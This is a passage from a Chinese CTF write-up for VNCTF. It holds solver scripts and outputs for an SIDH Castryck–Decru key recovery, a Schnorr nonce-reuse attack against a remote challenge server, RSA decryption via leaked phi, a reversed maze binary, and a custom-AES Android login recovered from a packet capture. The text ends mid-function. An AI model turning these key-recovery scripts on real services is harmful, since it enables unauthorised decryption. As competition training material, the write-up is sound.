    if not os.path.isdir(REPO_DIR):
        cands = [d for d in os.listdir(".") if d.lower().startswith("castryck-decru-sagemath")]
        if not cands:
            raise RuntimeError("Cannot find extracted Castryck-Decru-SageMath dir")
        os.rename(cands[0], REPO_DIR)

def load_cd_core():
    repo_abs = os.path.abspath(REPO_DIR)
    if repo_abs not in sys.path:
        sys.path.insert(0, repo_abs)

    old = os.getcwd()
    os.chdir(repo_abs)
    try:
        # speedup is useful and safe
        if os.path.exists("speedup.sage"):
            print("[*] load speedup.sage")
            load("speedup.sage")

        # ONLY core attack files (avoid demo/test .sage that auto-runs)
        for f in ["castryck_decru_attack.sage", "castryck_decru_shortcut.sage"]:
            if os.path.exists(f):
                print("[*] load", f)
                load(f)
    finally:
        os.chdir(old)

def extract_bob_key(txt):
    m = re.search(r"Bob's secret key revealed as:\s*([0-9]+)", txt)
    if m:
        return ZZ(m.group(1))
    m = re.search(r"Bob.*key.*:\s*([0-9]+)", txt)
    if m:
        return ZZ(m.group(1))
    return None

ensure_cd_repo()
load_cd_core()


# ============================================================
# 4) Build two_i = generate_distortion_map(E_start)
#    IMPORTANT: two_i is a callable endomorphism, NOT an integer
# ============================================================
import public_values_aux
public_values_aux.p = p

if not hasattr(public_values_aux, "generate_distortion_map"):
    raise RuntimeError("public_values_aux.generate_distortion_map not found (repo mismatch).")

two_i = public_values_aux.generate_distortion_map(E_start)


# ============================================================
# 5) Call CastryckDecruAttack with correct named args
# ============================================================
if "CastryckDecruAttack" not in globals():
    raise RuntimeError("CastryckDecruAttack not found after loading core files.")

attack = globals()["CastryckDecruAttack"]
spec = inspect.getfullargspec(attack)

pool = {
    "a": a, "b": b, "p": p,
    "E_start": E_start, "E0": E_start, "E": E_start,
    "EA": EA, "PA": PA, "QA": QA,
    "EB": EB, "PB": PB, "QB": QB,
    "P2": P2, "Q2": Q2, "P3": P3, "Q3": Q3,
    "two_i": two_i,
}

kwargs = {}
for name in spec.args:
    if name in pool:
        kwargs[name] = pool[name]
    else:
        lname = name.lower()
        if lname in pool:
            kwargs[name] = pool[lname]

print("[+] running Castryck–Decru on this instance ...")

buf = io.StringIO()
with redirect_stdout(buf):
    ret = attack(**kwargs)
out = buf.getvalue()

bobs_key = None
try:
    if ret is not None:
        bobs_key = ZZ(ret)
except Exception:
    pass
if bobs_key is None:
    bobs_key = extract_bob_key(out)

if bobs_key is None:
    print("[!] Attack output:\n", out)
    raise RuntimeError("Attack did not return/print Bob key.")

print("[+] recovered Bob secret key =", bobs_key)


# ============================================================
# 6) shared j + decrypt
#    shared_kernel_B = PA + skB*QA   on EA
# ============================================================
shared_kernel = PA + bobs_key * QA
phi_shared = EA.isogeny(shared_kernel, algorithm="factored")
shared_j = phi_shared.codomain().j_invariant()
print("[+] shared j =", shared_j)

key = sha256(str(shared_j).encode()).digest()
iv = bytes.fromhex(data["iv"])
ct = bytes.fromhex(data["ciphertext"])

pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
pt = unpad(pt, 16)

print("[+] plaintext (bytes):", pt)
try:
    print("[+] plaintext (utf-8):", pt.decode())
except Exception:
    pass

```

结果

```
(latt) ➜  Crypto sage solve.sage
[+] a,b = 82 57
[+] p bits = 173
[+] deobfuscation OK (all integers)
[+] reconstructed curves and points
[*] load speedup.sage
[*] load castryck_decru_attack.sage
[*] load castryck_decru_shortcut.sage
[+] running Castryck–Decru on this instance ...
[+] recovered Bob secret key = 10886546902217234201381501
[+] shared j = 1142866251494327722024722943408357092304346310508060*i + 475127538965250882165412064274589165530169435364320
[+] plaintext (bytes): b'VNCTF{wo_buzhidao_shuoshenmo_zhejiushiFLAG}'
[+] plaintext (utf-8): VNCTF{wo_buzhidao_shuoshenmo_zhejiushiFLAG}
```



## **Schnorr**

这题虽然写着 *Special Honest Verifier ZK*，但 **Schnorr 本身同时具备 special soundness**：
只要拿到 **同一个承诺 (B=g^b)** 下、两个不同挑战 (x) 的响应 (z)，就能把 witness (a) 解出来：

[
z \equiv xa + b \pmod{p-1}
]

同一个 (b) 时两次：

[
\begin{aligned}
z_1 &\equiv x_1 a + b \
z_2 &\equiv x_2 a + b
\end{aligned}
\Rightarrow
z_2 - z_1 \equiv (x_2-x_1)a \pmod{p-1}
]

取 (x_1=1, x_2=2)（差是 1），直接得到：

[
a \equiv z_2 - z_1 \pmod{p-1}
]

关键是：远程服务每次连接都会用同一个 `init_seed` 初始化“伪随机”，所以 **每次新连接的 Round1 会产生相同的 (b)，从而相同的 (B)**。
于是我们开两次连接，各拿一次 Round1：第一次发 (x=1) 得 (z_1)，第二次发 (x=2) 得 (z_2)，立刻恢复 (a)，进而恢复 flag（通常 flag 很短，小于 512-bit 的 (p-1)，不会发生取模折叠；保险起见可以试 (a+k(p-1))）。

下面给你完整可跑的解题脚本（pwntools）：

```python
#!/usr/bin/env python3
from pwn import remote, context
import re
from Crypto.Util.number import long_to_bytes

context.log_level = "error"  # 想看交互可改成 "debug"

HOST = "114.66.24.228"
PORT = 32487

re_int = re.compile(rb"^\s*([A-Za-z]+)\s*=\s*([0-9]+)\s*$")

def recv_int_line(io, key: bytes) -> int:
    """
    Read lines until we find: "<key> = <int>"
    """
    while True:
        line = io.recvline(timeout=5)
        if not line:
            raise EOFError("connection closed while reading")
        m = re_int.match(line)
        if m and m.group(1) == key:
            return int(m.group(2))

def get_round1_transcript(challenge_x: int):
    """
    Connect once, parse p,g,A,B from round 1, send x, parse z.
    Return (p, g, A, B, z)
    """
    io = remote(HOST, PORT)

    # Public parameters
    p = recv_int_line(io, b"p")
    g = recv_int_line(io, b"g")
    A = recv_int_line(io, b"A")

    # Round 1 commitment
    B = recv_int_line(io, b"B")

    # Challenge prompt -> send x
    io.recvuntil(b"x = ")
    io.sendline(str(challenge_x).encode())

    # Response
    z = recv_int_line(io, b"z")

    # End the session (answer 'n' to continue)
    io.recvuntil(b"(y/n):")
    io.sendline(b"n")
    io.close()

    return p, g, A, B, z

def recover_flag_from_a(a: int, mod: int):
    """
    flag_int = bytes_to_long(flag.encode()) % (p-1) = a
    Usually flag_int < mod, so a is exact.
    But we try a + k*mod a few times to be safe.
    """
    for k in range(0, 8):
        cand = a + k * mod
        bs = long_to_bytes(cand)
        # 常见 CTF flag 格式
        if b"flag{" in bs and bs.endswith(b"}"):
            try:
                return bs.decode()
            except:
                return bs
        # 有些题是 FLAG{...}
        if b"FLAG{" in bs and bs.endswith(b"}"):
            try:
                return bs.decode()
            except:
                return bs
    # fallback: 直接返回最可能的那个
    try:
        return long_to_bytes(a).decode()
    except:
        return long_to_bytes(a)

def main():
    # 第一次：x1=1
    p1, g1, A1, B1, z1 = get_round1_transcript(1)
    # 第二次：x2=2
    p2, g2, A2, B2, z2 = get_round1_transcript(2)

    # sanity checks：确保两次是同一组参数且 Round1 的 B 一样（同 nonce）
    assert p1 == p2 and g1 == g2 and A1 == A2, "public parameters changed (unexpected)"
    assert B1 == B2, "commitment B differs; retry (server might not be deterministic per-connection?)"

    mod = p1 - 1

    # a = z2 - z1 mod (p-1) because x2-x1=1
    a = (z2 - z1) % mod

    flag = recover_flag_from_a(a, mod)
    print(flag)

if __name__ == "__main__":
    main()
```

VNCTF{e3554c0f-a0bc-44de-b99c-0a25d953a103}



## **math_rsa**

这题的“额外数学约束”其实把 **φ(n)** 直接泄露出来了（只差一个 16-bit 素数因子），所以可以把 RSA 秒掉。

------

### 1) 把 assert 式子化简（核心突破口）

题目里：

- (x = \varphi(n) - 1)
- (u=\text{16-bit prime})
- (t = 2u)
- (y = t + 1)

断言：

[
(x^2+1)(y^2+1) - 2(x-y)(xy-1) = 4(k+xy)
]

把左边展开整理（建议你手推一遍，会发现是个非常漂亮的平方结构），可化为：

[
(y-1)^2(x+1)^2 = 4k
]

代回 (x+1=\varphi(n))，(y-1=t=2u)：

[
(2u)^2\varphi(n)^2 = 4k
\Rightarrow u^2\varphi(n)^2 = k
\Rightarrow (u\varphi(n))^2 = k
]

所以：

[
\sqrt{k} = u\varphi(n)
\Rightarrow \varphi(n) = \frac{\sqrt{k}}{u}
]

**结论：** 只要算出 (r=\sqrt{k})，再找出 16-bit 素数 (u\mid r)，就得到了 (\varphi(n))。

> 这也是出题人把 (k) 写成一个完全平方数的原因：你能直接 `isqrt(k)` 得到整数。

------

### 2) 拿到 φ(n) 后常规分解 n

有了 (\varphi(n)=(p-1)(q-1)=n-(p+q)+1)，可得：

[
p+q = n-\varphi(n)+1
]

再解二次方程：

[
X^2-(p+q)X+n=0
]

判别式：

[
\Delta = (p+q)^2-4n
]

(\sqrt{\Delta}) 是整数，进而：

[
p=\frac{(p+q)+\sqrt{\Delta}}2,\quad
q=\frac{(p+q)-\sqrt{\Delta}}2
]

最后解密 (m=c^d\bmod n)，其中 (d=e^{-1}\bmod \varphi(n))。

------

### 3) 可直接跑的解题脚本（推荐）

```python
from math import isqrt
from Crypto.Util.number import long_to_bytes
from sympy import primerange

# ====== paste challenge numbers ======
n = 14070754234209585800232634546325624819982185952673905053702891604674100339022883248944477908133810472748877029408864634701590339742452010000798957135872412483891523031580735317558166390805963001389999673532396972009696089072742463405543527845901369617515343242940788986578427709036923957774197805224415531570285914497828532354144069019482248200179658346673726866641476722431602154777272137461817946690611413973565446874772983684785869431957078489177937408583077761820157276339873500082526060431619271198751378603409721518832711634990892781578484012381667814631979944383411800101335129369193315802989383955827098934489
e = 65537
c = 12312807681090775663449755503116041117407837995529562718510452391461356192258329776159493018768087453289696353524051692157990247921285844615014418841030154700106173452384129940303909074742769886414052488853604191654590458187680183616318236293852380899979151260836670423218871805674446000309373481725774969422672736229527525591328471860345983778028010745586148340546463680818388894336222353977838015397994043740268968888435671821802946193800752173055888706754526261663215087248329005557071106096518012133237897251421810710854712833248875972001538173403966229724632452895508035768462851571544231619079557987628227178358
k = 485723311775451084490131424696603828503121391558424003875128327297219030209620409301965720801386755451211861235029553063690749071961769290228672699730274712790110328643361418488523850331864608239660637323505924467595552293954200495174815985511827027913668477355984099228100469167128884236364008368230807336455721259701674165150959031166621381089213574626382643770012299575625039962530813909883594225301664728207560469046767485067146540498028505317113631970909809355823386324477936590351860786770580377775431764048693195017557432320430650328751116174124989038139756718362090105378540643587230129563930454260456320785629555493541609065309679709263733546183441765688806201058755252368942465271917663774868678682736973621371451440269201543952580232165981094719134791956854961433894740133317928275468758142862373593473875148862015695758191730229010960894713851228770656646728682145295722403096813082295018446712479920173040974429645523244575300611492359684052455691388127306813958610152185716611576776736342210195290674162667807163446158064125000445084485749597675094544031166691527647433823855652513968545236726519051559119550903995500324781631036492013723999955841701455597918532359171203698303815049834141108746893552928431581707889710001424400
# ================================

# 1) r = sqrt(k) = u * phi
r = isqrt(k)
assert r * r == k

# 2) 找 16-bit prime u，使 u | r
u_found = None
for u in primerange(2**15, 2**16):   # 16-bit primes
    if r % u == 0:
        u_found = u
        break
assert u_found is not None

phi = r // u_found

# 3) 用 phi 分解 n
s = n - phi + 1          # p+q
D = s*s - 4*n
sqrtD = isqrt(D)
assert sqrtD * sqrtD == D

p = (s + sqrtD) // 2
q = (s - sqrtD) // 2
assert p * q == n

# 4) RSA 解密
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

------

### 4) 本题最终 flag

根据给出的数据跑出来明文是：

**`VNCTF{hell0_rsa_w0rld!}`**



## **ez_maze**

动调脱壳

主逻辑

```
// Hidden C++ exception states: #wind=3
__int64 __fastcall sub_7FF70DBE1920(CWnd *a1)
{
  int n19_2; // esi
  char v3; // di
  __int64 v4; // rdx
  bool v5; // bl
  __int64 n1600; // rax
  CWnd *v7; // rcx
  __int64 n400; // r14
  __int64 n20; // rdi
  __int64 n400_1; // rbx
  __int64 n19; // rbx
  __int64 n19_1; // rdi
  __int64 n19_4; // r14
  _QWORD *v14; // rax
  int n19_3; // r12d
  unsigned int v16; // r13d
  __int64 v17; // r14
  __int64 v18; // r15
  unsigned __int64 n0x13_1; // rbx
  unsigned __int64 n0x13; // rdi
  __int16 v21; // ax
  _QWORD *v23; // [rsp+20h] [rbp-58h]
  _BYTE v24[8]; // [rsp+28h] [rbp-50h] BYREF
  __int64 v25; // [rsp+30h] [rbp-48h] BYREF
  const wchar_t *v26; // [rsp+38h] [rbp-40h] BYREF

  n19_2 = 0;
  v3 = 0;
  LODWORD(v25) = 0;
  ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>(&v25);
  CWnd::GetWindowTextW((char *)a1 + 376, &v25);
  v5 = 1;
  if ( *(_DWORD *)(v25 - 16) )
  {
    v3 = 1;
    v4 = *(_QWORD *)ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::SpanIncluding(
                      &v25,
                      &v26,
                      aWasd);                   // "wasd"
    if ( *(_DWORD *)(v4 - 16) == *(_DWORD *)(v25 - 16) )
      v5 = 0;
  }
  if ( (v3 & 1) != 0 )
    ATL::CSimpleStringT<wchar_t,1>::~CSimpleStringT<wchar_t,1>(&v26);
  if ( v5 )
  {
    CWnd::MessageBoxW(a1, (const wchar_t *)qword_7FF70DBE4DC0, aError, 0x10u);// "Error"
    return ATL::CSimpleStringT<wchar_t,1>::~CSimpleStringT<wchar_t,1>(&v25);
  }
  srand(0x64u);
  n1600 = 0;
  v7 = a1;
  do
  {
    *((_DWORD *)v7 + 152) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 612) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 616) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 620) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 624) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 628) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 632) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 636) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 640) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 644) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 648) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 652) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 656) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 660) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 664) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 668) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 672) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 676) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 680) = 1;
    *(_DWORD *)((char *)a1 + n1600 + 684) = 1;
    n1600 += 80;
    v7 = (CWnd *)((char *)v7 + 80);
  }
  while ( n1600 < 1600 );
  *((_DWORD *)a1 + 152) = 0;
  for ( n400 = 0; n400 < 400; n400 += 20 )
  {
    n20 = 0;
    n400_1 = n400;
    do
    {
      if ( rand() % 10 > 2 )
        *((_DWORD *)a1 + n400_1 + 152) = 0;
      ++n20;
      ++n400_1;
    }
    while ( n20 < 20 );
  }
  *((_DWORD *)a1 + 152) = 0;
  n19 = 0;
  n19_1 = 0;
  while ( n19_1 != 19 )
  {
    if ( n19_1 >= 19 )
    {
LABEL_20:
      if ( n19 < 19 )
        ++n19;
      *((_DWORD *)a1 + 20 * n19 + n19_1 + 152) = 0;
    }
    else
    {
      n19_4 = n19_1 + 1;
      if ( n19 < 19 && (rand() & 1) != 0 )
      {
        ++n19;
        n19_4 = n19_1;
      }
      n19_1 = n19_4;
      *((_DWORD *)a1 + 20 * n19 + n19_4 + 152) = 0;
    }
  }
  if ( n19 != 19 )
    goto LABEL_20;
  *((_DWORD *)a1 + 551) = 0;
  v14 = (_QWORD *)ATL::CSimpleStringT<wchar_t,1>::CSimpleStringT<wchar_t,1>(v24, &v25);
  v23 = v14;
  n19_3 = 0;
  v16 = 0;
  if ( *(int *)(*v14 - 16LL) > 0 )
  {
    v17 = 0;
    v18 = 0;
    n0x13_1 = 0;
    n0x13 = 0;
    while ( 1 )
    {
      v21 = ATL::CSimpleStringT<wchar_t,1>::operator[](v14, v16);
      switch ( v21 )
      {
        case 'a':
          ++n19_2;
          ++v17;
          ++n0x13;
          break;
        case 'd':
          --n19_2;
          --v17;
          --n0x13;
          break;
        case 's':
          --n19_3;
          --n0x13_1;
          v18 -= 20;
          break;
        case 'w':
          ++n19_3;
          ++n0x13_1;
          v18 += 20;
          break;
      }
      if ( n0x13 > 0x13 || n0x13_1 > 0x13 || *((_DWORD *)a1 + v18 + v17 + 152) == 1 )
        break;
      if ( (signed int)++v16 >= *(_DWORD *)(*v23 - 16LL) )
      {
        if ( n19_2 == 19 && n19_3 == 19 )
        {
          ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>(&v26);
          ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::Format(&v26, aCorrectYourFla, *v23);// "correct! your flag is VNCTF{%s} "
          CWnd::MessageBoxW(a1, v26, aCongratulation, 0x40u);// "Congratulations"
          ATL::CSimpleStringT<wchar_t,1>::~CSimpleStringT<wchar_t,1>(&v26);
          goto LABEL_47;
        }
        break;
      }
      v14 = v23;
    }
  }
  CWnd::MessageBoxW(a1, aWrongTryAgain, aError, 0x10u);// "Error"
LABEL_47:
  ATL::CSimpleStringT<wchar_t,1>::~CSimpleStringT<wchar_t,1>(v23);
  return ATL::CSimpleStringT<wchar_t,1>::~CSimpleStringT<wchar_t,1>(&v25);
}
```

编写解密脚本

```
import collections

# ==========================================
# 1. 模拟 MSVC 的随机数生成器 (LCG算法)
# ==========================================
class MSVCRand:
    def __init__(self, seed):
        self.state = seed

    def rand(self):
        # MSVC rand() 的标准实现
        self.state = (self.state * 214013 + 2531011) & 0xFFFFFFFF
        return (self.state >> 16) & 0x7FFF

# ==========================================
# 2. 复现地图生成逻辑
# ==========================================
def generate_map():
    r = MSVCRand(0x64)  # srand(100)
    
    # 初始化 20x20 网格，默认为 1 (墙)
    grid = [1] * 400
    
    # 第一遍：随机打洞 (70%概率变成路)
    for i in range(400):
        if (r.rand() % 10) > 2:
            grid[i] = 0
            
    # 第二遍：生成必通路径
    # 逻辑对应代码中的 while ( n19_1 != 19 ) ...
    grid[0] = 0 # 起点设为路
    x, y = 0, 0
    
    while x != 19:
        next_x = x + 1
        move_down = False
        
        # 对应: if ( n19 < 19 && (rand() & 1) != 0 )
        if y < 19:
            if (r.rand() & 1) != 0:
                move_down = True
        
        if move_down:
            y += 1
            # 如果向下走，x 不变 (next_x 回退为 x)
            next_x = x
        
        x = next_x
        grid[y * 20 + x] = 0
        
    # 处理剩下的部分（如果x到了19但y还没到19，直通到底）
    while y < 19:
        y += 1
        grid[y * 20 + x] = 0
        
    return grid

# ==========================================
# 3. BFS 寻找最短路径
# ==========================================
def solve_maze(grid):
    start = (0, 0)
    target = (19, 19)
    queue = collections.deque([(start, "")]) # (坐标, 路径字符串)
    visited = set()
    visited.add(start)
    
    # 题目定义的诡异操作键位
    # 'w': Down (y+1)
    # 's': Up   (y-1)
    # 'a': Right(x+1)
    # 'd': Left (x-1)
    moves = [
        (0, 1, 'w'), 
        (0, -1, 's'), 
        (1, 0, 'a'), 
        (-1, 0, 'd')
    ]
    
    while queue:
        (cx, cy), path = queue.popleft()
        
        if (cx, cy) == target:
            return path
        
        for dx, dy, key in moves:
            nx, ny = cx + dx, cy + dy
            
            # 检查边界
            if 0 <= nx < 20 and 0 <= ny < 20:
                # 检查是否撞墙 (0是路，1是墙)
                if grid[ny * 20 + nx] == 0:
                    if (nx, ny) not in visited:
                        visited.add((nx, ny))
                        queue.append(((nx, ny), path + key))
                        
    return None

# ==========================================
# Main
# ==========================================
maze = generate_map()
flag_path = solve_maze(maze)

print(f"最短路径长度: {len(flag_path)}")
print(f"Flag: VNCTF{{{flag_path}}}")

# 可视化地图 (方便调试)
print("\n地图预览 (S:起点, E:终点, .:路, #:墙):")
for y in range(20):
    line = ""
    for x in range(20):
        if x == 0 and y == 0: char = "S"
        elif x == 19 and y == 19: char = "E"
        else: char = "." if maze[y*20+x] == 0 else "#"
        line += char + " "
    print(line)
```

```
最短路径长度: 38
Flag: VNCTF{wwawwawwwaawwawawwaaawwawwwwaaaaaaawaa}

地图预览 (S:起点, E:终点, .:路, #:墙):
S . . . . . . # . . # . . . . . . # . # 
. . # # . . . . # # . # . . . . . # . . 
. . . # . . . . . . # # . . . # . . . . 
# . . # . # . . . . # . # . . . # . # . 
. . . . . # # . # . # . . . . . # # . # 
. # . . . . . # # # . . . . # # # . # . 
. . . # . . . # # . . # # # . . # . . . 
. # . . . # . # . . # . . . # . . . . . 
. . # # . . # . . . . # . # . . # # . # 
# . # . . . . . . # . . . . . # . # # . 
# . # . # . . . . # . . # . . . # . # . 
. . . . # # . . . . . . . . . . # # # . 
. . . . # . . . . . . . . . . # . . . . 
# . . . . # . # # . # . . . . . . . # # 
# . # . . . # . # . . . . . . # . . . . 
# # # . . # . . . # . . . # # . . . . . 
. . . . . # # . # . . # . . . . # . # . 
# . # . # # . . . # . . . . . . # . # . 
. # . # . . . . . . . . . . . . . . . . 
. # . . # . . . . # . . # . # . # . . E 

进程已结束，退出代码为 0
```

## **Login**

分析后在流量包找getkey

```
GET /getkey HTTP/1.1
Accept: text/plain
User-Agent: Dalvik/2.1.0 (Linux; U; Android 15; 2312DRAABC Build/AP3A.240905.015.A2)
Host: 192.168.1.5:8080
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.11.0
Date: Fri, 23 Jan 2026 11:58:42 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 16

MnpiiylSrRk_mZ-H
```

```
POST /register HTTP/1.1
Content-Type: text/plain; charset=utf-8
sign: ff42fc4b17a74e63052d9b02886b4f3e
Content-Length: 64
User-Agent: Dalvik/2.1.0 (Linux; U; Android 15; 2312DRAABC Build/AP3A.240905.015.A2)
Host: 192.168.1.5:8080
Connection: Keep-Alive
Accept-Encoding: gzip

Y7nFpNWxMh0rzWixEN1+1dzQPzjE/PxfCVWEvGww3eK+fIstVlwllNUaHFujEvegHTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.11.0
Date: Fri, 23 Jan 2026 11:58:55 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 16

register success

POST /login HTTP/1.1
Content-Type: text/plain; charset=utf-8
sign: ff42fc4b17a74e63052d9b02886b4f3e
Content-Length: 64
User-Agent: Dalvik/2.1.0 (Linux; U; Android 15; 2312DRAABC Build/AP3A.240905.015.A2)
Host: 192.168.1.5:8080
Connection: Keep-Alive
Accept-Encoding: gzip

Y7nFpNWxMh0rzWixEN1+1dzQPzjE/PxfCVWEvGww3eK+fIstVlwllNUaHFujEvegHTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.11.0
Date: Fri, 23 Jan 2026 11:59:14 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 27

VNCTF{test!!test!!!test!!!}
```



分析.so

base64表是自定义的

aRstuvwlbcdefgh db 'RSTUVWLbcdefghiMNOPrstuvQXYZajCklmnEFGHIJKwxyz01ABD234opq56789+/',0

sbox提取出来

91直接要素察觉（AddRoundKey 额外 XOR 0x91

开始直接用 APP 登录会提示要用相同手机（因为 ctx 不同失败

解密脚本

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

# ================= Configuration =================

# 题目给出的 Key 和 Ciphertext
TARGET_KEY = "MnpiiylSrRk_mZ-H"
TARGET_CIPHER = "Y7nFpNWxMh0rzWixEN1+1dzQPzjE/PxfCVWEvGww3eK+fIstVlwllNUaHFujEveg"

# 自定义 Base64 字母表
ALPHABET = "RSTUVWLbcdefghiMNOPrstuvQXYZajCklmnEFGHIJKwxyz01ABD234opq56789+/"
DEC_MAP = {ch: i for i, ch in enumerate(ALPHABET)}

# 自定义 S-Box
SBOX_HEX = """
20 7b 18 a7 42 44 d7 4a cd 32 d1 ec f3 81 a5 89 0e 91 4b f0
e9 5d 8d f5 46 fc 31 36 b6 ac 9b b9 26 09 e6 40 d4 b0 51 4f
9c 3e e7 79 30 88 b1 3c 7a 5c d3 14 5a ab 56 c0 04 29 d0 3b
1f f9 a3 57 00 8a 84 16 f4 1a ea 64 a6 d6 2e be 2f 17 c4 e0
1e 02 3a 22 8f 9f cb a8 2c 67 34 25 d5 ff ef f6 e2 aa d9 72
fe ce a1 78 85 96 2a 77 ca c1 37 74 a2 5e 6c fd b8 4d 7d 70
b3 dd cf 71 73 61 f8 19 48 e3 63 33 3d 15 ae 98 e5 80 bd bc
82 c6 94 01 e4 de 06 50 95 df 47 f7 90 8b 45 9a 6e 07 ad 1c
35 83 68 03 6f 5b b7 fb 1d c5 10 7c d8 6a cc 69 8e 24 4c 39
b4 a0 0b 52 e8 a9 b2 8c 0a bf 28 86 6d af da 41 fa 75 b5 43
c3 60 62 2b 55 f2 9e 2d 12 23 0d db 6b c7 38 7f 5f 97 08 ed
e1 bb ee 9d d2 92 49 3f dc 58 87 c2 ba 99 c9 4e f1 21 eb 13
65 59 76 0c c8 05 a4 54 93 1b 66 11 27 53 7e 0f
"""
SBOX = bytes(int(x, 16) for x in re.findall(r"[0-9a-fA-F]{2}", SBOX_HEX))

# 生成逆 S-Box
INV_SBOX = bytearray(256)
for i, b in enumerate(SBOX):
    INV_SBOX[b] = i
INV_SBOX = bytes(INV_SBOX)

# 自定义 Rcon (作用于 MSB)
RCON = [
    0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,
    0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000
]


# ================= AES Utils =================

def b64_custom_decode(s: str) -> bytes:
    s = re.sub(r"\s+", "", s.strip())
    if len(s) % 4 != 0:
        raise ValueError("cipher length must be multiple of 4")
    out = bytearray()
    for i in range(0, len(s), 4):
        quad = s[i:i + 4]
        pads = quad.count("=")
        vals = []
        for ch in quad:
            if ch == "=":
                vals.append(0)
            else:
                vals.append(DEC_MAP[ch])
        n = (vals[0] << 18) | (vals[1] << 12) | (vals[2] << 6) | vals[3]
        out.append((n >> 16) & 0xFF)
        if pads < 2:
            out.append((n >> 8) & 0xFF)
        if pads < 1:
            out.append(n & 0xFF)
    return bytes(out)


def bytes_to_state(block: bytes) -> list[int]:
    # 标准 AES 列优先填充 (Column-Major)
    # st[0] st[4] st[8]  st[12]
    # st[1] st[5] st[9]  st[13]
    # ...
    st = [0] * 16
    idx = 0
    for col in range(4):
        for row in range(4):
            st[4 * row + col] = block[idx]
            idx += 1
    return st


def state_to_bytes(st: list[int]) -> bytes:
    out = bytearray(16)
    idx = 0
    for col in range(4):
        for row in range(4):
            out[idx] = st[4 * row + col] & 0xFF
            idx += 1
    return bytes(out)


def xtime(b: int) -> int:
    b &= 0xFF
    return (((b << 1) ^ 0x1B) & 0xFF) if (b & 0x80) else ((b << 1) & 0xFF)


def gf_mul(a: int, b: int) -> int:
    res = 0
    while a:
        if a & 1:
            res ^= b
        b = xtime(b)
        a >>= 1
    return res & 0xFF


def inv_mix_columns(st: list[int]) -> None:
    for col in range(4):
        a0 = st[0 * 4 + col];
        a1 = st[1 * 4 + col];
        a2 = st[2 * 4 + col];
        a3 = st[3 * 4 + col]
        st[0 * 4 + col] = gf_mul(0x0e, a0) ^ gf_mul(0x0b, a1) ^ gf_mul(0x0d, a2) ^ gf_mul(0x09, a3)
        st[1 * 4 + col] = gf_mul(0x09, a0) ^ gf_mul(0x0e, a1) ^ gf_mul(0x0b, a2) ^ gf_mul(0x0d, a3)
        st[2 * 4 + col] = gf_mul(0x0d, a0) ^ gf_mul(0x09, a1) ^ gf_mul(0x0e, a2) ^ gf_mul(0x0b, a3)
        st[3 * 4 + col] = gf_mul(0x0b, a0) ^ gf_mul(0x0d, a1) ^ gf_mul(0x09, a2) ^ gf_mul(0x0e, a3)


def inv_shift_rows(st: list[int]) -> None:
    for row in range(4):
        r = st[4 * row:4 * row + 4]
        rot = row
        # 逆移位：右移 row 位
        st[4 * row:4 * row + 4] = (r[-rot:] + r[:-rot]) if rot else r


def inv_sub_bytes(st: list[int]) -> None:
    for i in range(16):
        st[i] = INV_SBOX[st[i]]


def add_round_key(st: list[int], words4: list[int]) -> None:
    # 核心魔改点：对应 sub_25D80，每个字节额外异或 0x91
    # words4 是该轮的4个32位密钥字
    for row in range(4):
        for col in range(4):
            w = words4[col]
            # 从 32位字中提取对应行的字节 (Big Endian 视角)
            kb = (w >> (24 - 8 * row)) & 0xFF
            st[4 * row + col] ^= (kb ^ 0x91)
            st[4 * row + col] &= 0xFF


def subword(w: int) -> int:
    return ((SBOX[(w >> 24) & 0xFF] << 24) |
            (SBOX[(w >> 16) & 0xFF] << 16) |
            (SBOX[(w >> 8) & 0xFF] << 8) |
            (SBOX[w & 0xFF]))


def rotword(w: int) -> int:
    return ((w << 8) & 0xFFFFFFFF) | ((w >> 24) & 0xFF)


def expand_key(key16: bytes) -> list[int]:
    # 核心魔改点：RCON 作用在 MSB
    w = [0] * 44
    for i in range(4):
        w[i] = int.from_bytes(key16[4 * i:4 * i + 4], "big")
    for i in range(4, 44):
        temp = w[i - 1]
        if i % 4 == 0:
            temp = subword(rotword(temp)) ^ RCON[i // 4 - 1]
        w[i] = w[i - 4] ^ temp
    return w


def decrypt_block(ct_block: bytes, w: list[int]) -> bytes:
    st = bytes_to_state(ct_block)

    def rk(round_idx: int) -> list[int]:
        return w[4 * round_idx:4 * round_idx + 4]

    # Round 10: ARK + ISR + ISB
    add_round_key(st, rk(10))
    inv_shift_rows(st)
